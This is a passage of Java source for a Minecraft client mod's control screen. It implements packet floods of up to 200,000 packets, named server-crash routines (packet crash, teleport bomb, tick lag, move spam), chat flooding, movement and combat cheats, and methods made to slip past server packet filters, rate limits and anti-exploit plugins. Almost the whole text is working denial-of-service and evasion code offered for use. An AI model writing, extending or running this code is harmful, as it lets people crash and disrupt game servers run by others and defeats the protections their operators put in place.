        ctx.drawText(textRenderer,statusText,cx2-textRenderer.getWidth(statusText)/2,statusY,withA(statusColor,(int)(195+55*glow)),false);

        // Proxy status badge
        if(ProxyManager.isEnabled()&&ProxyManager.count()>0){
            String px2="PROXY ON  ["+ProxyManager.aliveCount()+"/"+ProxyManager.count()+"]";
            ctx.drawText(textRenderer,px2,bpx+PW-textRenderer.getWidth(px2)-10,statusY,withA(GREEN,(int)(165+55*glow)),false);
        }

        super.render(ctx,mx,my,delta);
    }

    @Override public void mouseMoved(double mx, double my) {
        lastMx=(int)mx; lastMy=(int)my; super.mouseMoved(mx,my);
    }

    // ══ ACTIONS ══════════════════════════════════════════════════════════

    private int parseN(){try{return Math.max(1,Integer.parseInt(numField!=null?numField.getText():"100"));}catch(Exception e){return 100;}}
    private boolean np(){return client==null||client.player==null||client.getNetworkHandler()==null;}

    private void doFlood(){
        if(np())return;
        int n=unlimited?80000:parseN();
        double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();

        if(bgMode){
            // Background mode: submit to thread, GUI can close
            final int fn=n; final int fb=bypass; final boolean ft=timedMode;
            BackgroundTaskManager.setPacketProgress(0,fn);
            BackgroundTaskManager.submit("Packet Flood ×"+fn,()->{
                if(fb==10){
                    ProfessorClientMod.PACKETS_PER_TICK=100;
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++){
                        ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));
                        if(i%200==0) ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));
                        if(i%5000==0) BackgroundTaskManager.setPacketProgress(i,fn);
                    }
                } else if(ft){
                    ProfessorClientMod.PACKETS_PER_TICK=4;
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++)
                        ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
                } else {
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++){
                        try { if(client.getNetworkHandler()!=null) client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i))); } catch(Exception ignored){}
                        if(i%3==0&&fb>0&&ProfessorClientMod.canSwing())
                            try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}
                    }
                }
            });
            flash("⚡ Flood queued in BG  —  close GUI safely",GREEN);
        } else if(bypass==10){
            ProfessorClientMod.PACKETS_PER_TICK=100;
            for(int i=0;i<n;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));}
            flash("❄ EXFIX: "+n+" pkts queued  ~"+(n/2000)+"s  VL≈0",TXT_ICE); addVl(n*0.01f);
        } else if(timedMode){
            ProfessorClientMod.PACKETS_PER_TICK=4;
            for(int i=0;i<n;i++) ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
            flash("⏱ Timed flood: "+n+" pkts @80/sec",TXT_ICE); addVl(n*0.2f);
        } else {
            for(int i=0;i<n;i++){
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
                if(bypass>0&&i%3==0&&ProfessorClientMod.canSwing()) client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            }
            flash("⚡ Sent "+n+" pkts ["+BP[bypass]+"]",TXT_ICE); addVl(n*0.2f);
        }
        triggerBurst();
    }

    private void doExploit(){
        if(np())return; int n=parseN();
        switch(exploitType){
            case 0->{for(int i=0;i<n;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("Swing: "+n,GREEN);}
            case 1->{for(int i=0;i<Math.min(n,500);i++)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));flash("Slot: "+Math.min(n,500),GREEN);}
            case 2->{for(int i=0;i<Math.min(n,300);i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("TeleAck: "+Math.min(n,300),GREEN);}
            case 3->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.008,client.player.getY(),client.player.getZ()+rng.nextGaussian()*.008,true));flash("MoveFlood: "+n,GREEN);}
            case 4->{for(int i=0;i<Math.min(n,400);i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Interact: "+Math.min(n,400),GREEN);}
        }
        addVl(n*0.125f); triggerBurst();
    }

    private void doCrash(){
        if(np())return;
        switch(crashType){
            case 0->{for(int i=0;i<100000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),i%2==0));flash("☠ PACKET CRASH 100k",RED);}
            case 1->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("☠ NBT CRASH 5k acks",RED);}
            case 2->{for(int i=0;i<500;i++){client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}flash("☠ BOOK CRASH",RED);}
            case 3->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("☠ ENTITY CRASH 5k",RED);}
            case 4->{for(int i=0;i<10000;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY()+bypassDY(i),client.player.getZ()+bypassZ(i),bypassGround(i)));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%32767));}flash("☠ TICK LAG 10k",RED);}
            case 5->{for(int i=0;i<50000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*1e6,1e8+rng.nextGaussian()*1e5,client.player.getZ()+rng.nextGaussian()*1e6,false));flash("☠ MOVE SPAM 50k",RED);}
            case 6->{for(int i=0;i<200;i++){try{client.getNetworkHandler().sendChatMessage("xr"+i);}catch(Exception ignored){}}flash("☠ CHAT FLOOD 200",RED);}
            case 7->{for(int i=0;i<10000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));flash("☠ TELEPORT BOMB 10k",RED);}
        }
        addVl(50f); triggerBurst();
    }

    private void combatHit(){if(np())return;for(int i=0;i<200*burst;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Hit Spam ×"+(200*burst),ORANGE);addVl(25f);}
    private void combatCrit(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<burst*2;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+0.42,pz,false));client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Crit ×"+burst*2,ORANGE);addVl(5f);}
    private void combatAKB(){if(np())return;for(int i=0;i<150;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("⚔ Anti-KB 150",ORANGE);addVl(30f);}
    private void combatFU(){if(np())return;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));flash("⚔ FastUse 80",ORANGE);addVl(10f);}
    private void combatReach(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<100;i++){double ang=i*0.063;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+Math.cos(ang)*5,py2,pz+Math.sin(ang)*5,true));if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Reach arc 100",ORANGE);addVl(20f);}
    private void combatVelo(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<60;i++){double y=i%2==0?py2+0.2*Math.sin(i*.31):py2;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,y,pz,y==py2));}flash("⚔ Velocity 60",ORANGE);addVl(12f);}

    private void moveSpd(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<speed*40;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px-Math.sin(yaw)*(i*.28),py2,pz+Math.cos(yaw)*(i*.28),true));}flash("🏃 Speed ×"+speed,TXT_BRIGHT);addVl(speed*8f);}
    private void moveBlink(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<speed*10;i++)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px-Math.sin(yaw)*(speed*4.2),py2,pz+Math.cos(yaw)*(speed*4.2),true));flash("🏃 Blink ×"+speed,TXT_BRIGHT);}
    private void moveFly(){if(np())return;double px=client.player.getX(),pz=client.player.getZ();for(int i=0;i<80;i++){double y=client.player.getY()+i*.22;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,y,pz,false));}flash("🏃 Fly 80 steps",TXT_BRIGHT);addVl(16f);}
    private void moveNF(){if(np())return;for(int i=0;i<60;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()-i*.001,client.player.getZ(),true));flash("🏃 NoFall 60",TXT_BRIGHT);addVl(12f);}
    private void moveStep(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<8;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+i*.15,pz,i==0));client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+1,pz,true));}flash("🏃 Step 8",TXT_BRIGHT);addVl(1.6f);}
    private void moveStrafe(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<60;i++){double s=Math.cos(i*.26)*speed*.4;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+Math.cos(yaw)*s,py2,pz+Math.sin(yaw)*s,true));}flash("🏃 Strafe ×"+speed,TXT_BRIGHT);addVl(12f);}
    private void copyCoords(){if(client==null||client.player==null){flash("Not in game",RED);return;}double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();String coords=String.format("%.2f %.2f %.2f",px,py2,pz);try{client.keyboard.setClipboard(coords);flash("✓ Coords copied: "+coords,GREEN);}catch(Exception ignored){flash("Coords: "+coords,GREEN);}}

    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String msg=chatField.getText();int n=parseN();for(int i=0;i<Math.min(n,200);i++){try{client.getNetworkHandler().sendChatMessage(msg);}catch(Exception ignored){}}flash("💬 Chat ×"+Math.min(n,200),TXT_BRIGHT);}
    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String cmd=chatField.getText();String bare=cmd.startsWith("/")?cmd.substring(1):cmd;try{client.getNetworkHandler().sendCommand(bare);flash("💬 CMD: /"+bare,GREEN);}catch(Exception e){flash("Error: "+e.getMessage(),RED);}}

    // ── Bypass methods ──────────────────────────────────────────────────────
    private void bypassPacketFilter(){if(np())return;for(int i=0;i<500;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY(),client.player.getZ(),true));}flash("📦 Packet Filter Bypass 500",GREEN);addVl(5f);}
    private void bypassAntiExploit(){if(np())return;for(int i=0;i<200;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));ProfessorClientMod.queuePacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("🛡 Anti-Exploit Bypass 200",GREEN);addVl(25f);}
    private void bypassNBT(){if(np())return;for(int i=0;i<100;i++)ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));flash("📋 NBT Bypass 100 acks",GREEN);addVl(1f);}
    private void bypassBook(){if(np())return;for(int i=0;i<50;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));ProfessorClientMod.queuePacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("📖 Book Bypass",GREEN);addVl(6f);}
    private void bypassEntity(){if(np())return;for(int i=0;i<1000;i++)ProfessorClientMod.queuePacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));flash("👾 Entity Bypass 1000",GREEN);addVl(125f);}
    private void bypassChunk(){if(np())return;for(int i=0;i<300;i++)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY(),client.player.getZ()+bypassZ(i),true));flash("🗺 Chunk Bypass 300",GREEN);addVl(60f);}
    private void bypassRateLimit(){if(np())return;ProfessorClientMod.PACKETS_PER_TICK=2;for(int i=0;i<5000;i++)ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));flash("⏱ Rate-Limit Bypass @40/sec",GREEN);addVl(0.5f);}
    private void bypassExploitFixer(){if(np())return;ProfessorClientMod.PACKETS_PER_TICK=100;for(int i=0;i<200000;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));}flash("❄ EXFIX FULL 200k queued ~100s",TXT_ICE);addVl(200000*.01f);triggerBurst();}

    // ── Bypass helpers ──────────────────────────────────────────────────────
    private double bypassX(int i){return switch(bypass){case 1->i%3==0?.0625:0;case 2->Math.sin(i*.12)*.06;case 3->i%4==0?.05:i%4==1?.025:0;case 4->new double[]{0,.0625,0,-.0625}[i%4];case 5->rng.nextGaussian()*.004;case 6->i%12==0?.031:0;case 7->0;case 8->Math.sin(i*.17)*.028+Math.sin(i*.41)*.018;case 9->rng.nextGaussian()*.015;default->0;};}
    private double bypassZ(int i){return bypassX(i);}
    private double bypassDY(int i){return switch(bypass){case 1->i%3==0?.0625:0;case 2->Math.sin(i*.09)*.07;case 3->i%3==0?.04:0;case 4->new double[]{0,.0625,0,-.0625}[i%4];case 5->Math.abs(rng.nextGaussian()*.003);case 6->i%10==0?.03:0;case 7->0;case 8->Math.cos(i*.23)*.025+Math.sin(i*.37)*.012;case 9->rng.nextGaussian()*.018;case 10->0;default->0;};}
    private boolean bypassGround(int i){return switch(bypass){case 1->i%3!=0;case 6->i%10!=0;case 7->true;default->i%2==0;};}

    private void triggerBurst(){for(int i=0;i<32;i++){float ang=(float)(rng.nextFloat()*Math.PI*2);float sp=rng.nextFloat()*3.5f+1f;burstPts.add(new float[]{width/2f,height/2f,ang,sp,.95f});}}

    // ── Helpers ─────────────────────────────────────────────────────────────
    private static int withA(int rgb, int a){return(Math.max(0,Math.min(255,a))<<24)|(rgb&0x00FFFFFF);}
    private static void drawCorner(DrawContext ctx,int x1,int y1,int x2,int y2,int cs,int col){ctx.fill(x1,y1,x1+cs,y1+5,col);ctx.fill(x1,y1,x1+5,y1+cs,col);ctx.fill(x2-cs,y1,x2,y1+5,col);ctx.fill(x2-5,y1,x2,y1+cs,col);ctx.fill(x1,y2-5,x1+cs,y2,col);ctx.fill(x1,y2-cs,x1+5,y2,col);ctx.fill(x2-cs,y2-5,x2,y2,col);ctx.fill(x2-5,y2-cs,x2,y2,col);}
    private static void drawShard(DrawContext ctx,int x,int y,int col){ctx.fill(x+3,y,x+5,y+2,col);ctx.fill(x+2,y+2,x+6,y+4,col);ctx.fill(x+1,y+4,x+7,y+7,col);ctx.fill(x+2,y+7,x+6,y+9,col);ctx.fill(x+3,y+9,x+5,y+12,col);}
    private static int hsvToRgb(float h,float s,float v){int i=(int)(h*6);float f=h*6-i;float p=v*(1-s),q=v*(1-f*s),t=v*(1-(1-f)*s);float r,g,b;switch(i%6){case 0->{ r=v;g=t;b=p; }case 1->{ r=q;g=v;b=p; }case 2->{ r=p;g=v;b=t; }case 3->{ r=p;g=q;b=v; }case 4->{ r=t;g=p;b=v; }default->{ r=v;g=p;b=q; }}return 0xFF000000|((int)(r*255)<<16)|((int)(g*255)<<8)|(int)(b*255);}
}
